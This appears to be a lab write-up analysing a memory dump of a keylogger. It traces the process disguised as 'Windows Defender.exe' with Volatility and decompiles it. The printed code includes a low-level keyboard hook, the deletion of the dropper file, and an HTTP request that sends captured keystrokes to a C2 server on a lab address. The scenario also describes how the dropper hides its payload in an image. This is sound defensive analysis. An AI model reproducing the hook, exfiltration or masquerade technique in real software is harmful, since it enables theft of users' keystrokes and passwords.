## 1. Scenario
User executed an exe file they found on the Internet. 

The exe file, named *malware_downloader.exe*, works as follows:
1. create connection to C2 server at 192.168.56.1:8081
2. send an HTTP get request for *CATT.jpg* to the C2 server
3. write data in *CATT.jpg* at offset `0x1ffe` as *userdata.zip*
4. unzip *userdata.zip* to *keylogger.exe*
5. copy *keylogger.exe* to `C:\Users\Public\Windows Defender.exe`
6. delete *userdata.zip* and *keylogger.exe*
7. run `C:\Users\Public\Windows Defender.exe`

The new exe file, *Windows Defender.exe*, works as follows:
1. delete *malware_downloader.exe*
2. install hook to monitor keyboard input
3. start thread that sends captured keyboard input to C2 server at 192.168.56.1:8080

The memory dump was created with:
``` sh
$ VBoxManage list vms
"REMnux v7" {85cf9def-ded0-41ab-952b-bb4e1cccd015}
"Malware Analysis Clone" {63f97069-4511-42e4-892e-dcd89346882c}
"Forensics" {b40c3c06-7180-4a2b-9829-3aa783ec8941}
"SIFT workstation" {432384d6-0024-4d88-94ec-809f535947fe}
$ VBoxManage debugvm {63f97069-4511-42e4-892e-dcd89346882c} dumpvmcore --filename keylogger_captured.raw
```

## 2. analyzing memory dump
### 2.1. viewing active processes
First, I checked pslist:
``` sh
$ vol -r pretty -f keylogger_captured.raw windows.pslist > pslist.txt
$ cat pslist.txt
[REMOVED]
```
Upon first glance, nothing looked suspicious.

### 2.2. viewing process tree
Next I checked the process tree:
``` sh
$ vol -f keylogger_captured.raw -r pretty windows.pstree > pstree.txt
$ cat pstree.txt
[REMOVED]
		|  PID | PPID |  ImageFileName |      Offset(V) | Threads | Handles | SessionId | Wow64 |                     CreateTime |
[REMOVED]
*       | 5740 | 3896 | Windows Defend | 0xac87b0ef5080 |       9 |       - |         1 | False | 2026-04-08 06:06:16.000000 UTC |
[REMOVED]
```
PID 5740 parent process didn't exist anymore, which was suspicious.

``` sh
$ vol -f keylogger_captured.raw -r pretty windows.pstree --pid 5740
Volatility 3 Framework 2.27.0
   |  PID | PPID |  ImageFileName |      Offset(V) | Threads | Handles | SessionId | Wow64 |                     CreateTime | ExitTime |                                                     Audit |                                                                                     Cmd |                                 Path
*  | 5740 | 3896 | Windows Defend | 0xac87b0ef5080 |       9 |       - |         1 | False | 2026-04-08 06:06:16.000000 UTC |      N/A | \Device\HarddiskVolume2\Users\Public\Windows Defender.exe | "C:\Users\Public\Windows Defender.exe" "C:\Users\User\Downloads\malware_downloader.exe" | C:\Users\Public\Windows Defender.exe
** | 4712 | 5740 |    conhost.exe | 0xac87abc650c0 |       4 |       - |         1 | False | 2026-04-08 06:06:16.000000 UTC |      N/A |      \Device\HarddiskVolume2\Windows\System32\conhost.exe |                                                 \??\C:\Windows\system32\conhost.exe 0x4 |      C:\Windows\system32\conhost.exe
```

Upon further analysis, there are 2 things that catch my eye. First, the command line argument shows a suspicious exe file in the download directory. Next, the image is under `C:\Users\Public` which is strange for *Windows Defender*.

### 2.3. disassembling PID 5740

``` sh
$ vol -f keylogger_captured.raw windows.pslist --dump --pid 5740
Volatility 3 Framework 2.27.0
Progress:  100.00               PDB scanning finished
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output
5740    3896    Windows Defend  0xac87b0ef5080  9       -       1       False   2026-04-08 06:06:16.000000 UTC  N/A     5740.Windows Defend.0x7ff7b1310000.dmp
$ file 5740.Windows\ Defend.0x7ff7b1310000.dmp
5740.Windows Defend.0x7ff7b1310000.dmp: PE32+ executable (console) x86-64, for MS Windows, 19 sections
```
![[imported_functions_1.png]]
![[imported_functions_2.png]]

Upon dumping and the executable and viewing imported functions, several interesting functions can be seen. The executable seems to 1) create threads, 2) create hooks, and 3) connect to a remote server.

First, let's check references to WININET functions:

``` C
undefined8 FUN_7ff7b1311761(void)
{
[REMOVED]
  local_20 = InternetOpenA("keylogger",1,0,0,in_stack_fffffffffffffd08 & 0xffffffff00000000);
[REMOVED]
    local_28 = InternetConnectA(local_20,"192.168.56.1",0x1f90,0,0,CONCAT44(uVar5,3),0,0);
[REMOVED]
      local_30 = HttpOpenRequestA(local_28,&DAT_7ff7b131a02b,"/logs/",0,0,0,0,0);
[REMOVED]
        FUN_7ff7b1317fb0(local_2a8,(uint **)"{\"content\": \"STARTOFKEYS_%s_ENDOFKEYS\"}",
                         (uint *)s_NOTEPAD[13][160][160][160][160][_7ff7b131d040,uVar2);
						builtin_strncpy(local_2d8,"Content-Type: application/json\r\n",0x21);
[REMOVED]
						iVar1 = HttpSendRequestA(local_30,local_2d8,sVar4 & 0xffffffff,local_2a8,sVar3 & 0xffffffff)
[REMOVED]
```

Function at VA `0x7ff7b1311761` is the only function to reference `WININET` functions. It seems to establish a connection with the C2 server and send data an HTTP request.

The C2 server is at IP 192.168.56.1 and port 8080(`0x1f90`)

The HTTP request has `local_2d8` as the request header and `local_2a8` as the optional data. You can see the content of `local_2d8` from the `strncpy` function. `local_2a8` however, is not as straightforward. It is unclear what `FUN_7ff7b1317fb0` does, but from the format, it seems to be a function similar to `sprintf`, where the first argument is the buffer and the of the string follows. 

Assuming this hypothesis is correct, let's view what's inside `local_2a8`.

![[5740_VA_7ff7b131d040.png]]
``` hex
4e 4f 54 45 50 41 44 5b 31 33 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 5b 31 36 30 5d 50 41 53 53 57 4f 52 44 5b 31 36 30 5d 5b 31 38 36 5d 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

This is the data at VA `0x7ff7b131d040`. We can decode this using *Cyberchef*.

``` text
NOTEPAD[13][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160]PASSWORD[160][186]
```

We can assume `local_2a8` is as follows:

``` text
{"content": "STARTOFKEYS_NOTEPAD[13][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160][160]PASSWORD[160][186]_ENDOFKEYS"}
```

Now that we know what data is sent to the C2 server, time to see how it is collected. The data in `local_2a8` suggests keyboard input is being captured and exfiltrated. If this is true, `SetWindowsHookExA` should create a hook for keyboard input. 

![[5740_SetWindowsHookExA_references.png]]

There is only 1 reference to `SetWindowsHookExA`, at `0x7ff7b131168b`. Following this address, we can see:

``` C
undefined8 FUN_7ff7b131161a(undefined8 param_1,longlong param_2)
[REMOVED]
  Sleep(1000);
  remove(*(char **)(param_2 + 8));
  memset(s_NOTEPAD[13][160][160][160][160][_7ff7b131d040,0,500);
  local_10 = SetWindowsHookExA(0xd,(HOOKPROC)&LAB_7ff7b1311480,(HINSTANCE)0x0,0);
  if (local_10 == (HHOOK)0x0) {
    uVar1 = 0xffffffff;
  }
  else {
    InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_7ff7b131d240);
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_7ff7b13115a1,(LPVOID)0x0,
                 0,(LPDWORD)0x0);
    while( true ) {
      local_14 = GetMessageW(&local_48,(HWND)0x0,0,0);
      if (local_14 == 0) break;
      TranslateMessage(&local_48);
      DispatchMessageW(&local_48);
    }
    DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_7ff7b131d240);
    UnhookWindowsHookEx(local_10);
    uVar1 = 0;
  }
  return uVar1;
}
```

There are several interesting things we can find out from this function.

The `remove` function imported from *msvcrt.dll* is used to delete a file<sup>[1]</sup>. This means `param_2 + 8` is a pointer to the filename being deleted. We know that a suspicious exe file was passed as the second command line argument to PID 5740 when it started execution. Because each pointer is 8 bytes long, `param_2 + 8` would point to the second element in the `char*` array. Thus we can conclude this function is the main function, and that `C:\Users\User\Downloads\malware_downloader.exe` is the parent that spawned PID 5740.

The message functions are there because Windows requires a message loop to process low-level hooks<sup>[4]</sup>.

`0xd` is 13 in decimal, which means `SetWindowsHookExA` sets a hook on `WH_KEYBOARD_LL`<sup>[2]</sup>. This confirms our suspicion that keyboard input is being captured. 

At `0x7ff7b1311480` we should be able to find the hook procedure. 

``` C
void UndefinedFunction_7ff7b1311480(int param_1,WPARAM param_2,byte *param_3,undefined8 param_4)
{
  FILE aFStack_208 [10];
  byte bStack_9;

  if ((param_1 == 0) && (param_2 == 0x100)) {
    bStack_9 = *param_3;
    if (((bStack_9 < 0x41) || (0x5a < bStack_9)) && ((bStack_9 < 0x30 || (0x39 < bStack_9)))) {
      FUN_7ff7b1317fb0(aFStack_208,(uint **)"[%ld]",(uint *)(ulonglong)bStack_9,param_4);
    }
    else {
      FUN_7ff7b1317fb0(aFStack_208,(uint **)&DAT_7ff7b131a006,(uint *)(ulonglong)bStack_9,param_4);
    }
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_7ff7b131d240);
    strcat(s_NOTEPAD[13][160][160][160][160][_7ff7b131d040,(char *)aFStack_208);
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_7ff7b131d240);
  }
  CallNextHookEx((HHOOK)0x0,param_1,param_2,(LPARAM)param_3);
  return;
}
```

Because this function is a hook procedure, we can tell what each argument is<sup>[3]</sup>. `param_4` seems to be an error created while disassembling. 

We already concluded `FUN_7ff7b1317fb0` is a function like `sprintf`. This means `aFStack_208` contains some integer surrounded by brackets or `DAT_7ff7b131a006`. A quick check shows `DAT_7ff7b131a006` contains "%c". So `aFStack_208` contains either an integer or a character. From the string at `0x7ff7b131d040`, we can infer `aFStack_208` contains an integer if it is not an ascii character or an ascii character. `0x41`, `0x5a`, `0x30`, and `0x39` correspond to "A", "Z", "0", and "9", further supporting our theory.

The rest of the code concatenates `aFStack_208`, which is the key that was pressed, to `0x7ff7b131d040` to save it and then calls `CallNextHookEx` so the key input is passed along as if nothing happened. 

As a result of disassembling the executable, we now know a lot more than we did previously:
1. PID 5740 records keyboard input and sends it to a C2 server at 192.168.56.1:8080
2. `C:\Users\User\Downloads\malware_downloader.exe` is the parent process and has been deleted by PID 5740

### 2.4. open connections
We can verify what we found out from disassembling the executable. First let's check open connections:

``` sh
$ vol -r csv -f keylogger_captured.raw windows.netscan > netscan.csv
$ csvtool readable netscan.csv | grep -e "5740" -e "TreeDepth"
TreeDepth Offset         Proto LocalAddr                 LocalPort ForeignAddr  ForeignPort State       PID  Owner          Created
0         0xac87a8f0f010 TCPv4 192.168.56.5              49673     192.168.56.1 8080        ESTABLISHED 5740 Windows Defend 2026-04-08 06:06:27.000000 UTC
```

This confirms the C2 IP and port. 

## **check vol -h to look for plugins I can use to gather more data**

## references
[1] MicrosoftDocs/cpp-docs/docs/c-runtime-library/reference/remove-wremove.md, 2026/04/08, https://github.com/MicrosoftDocs/cpp-docs/blob/main/docs/c-runtime-library/reference/remove-wremove.md
[2] SetWindowsHookExA function (winuser.h), 2026/04/08, https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
[3] HOOKPROC callback function (winuser.h), 2026/04/08, https://learn.microsoft.com/en-us/windows/win32/api/winuser/nc-winuser-hookproc
[4] LowLevelKeyboardProc funcion, 2026/04/08, https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc
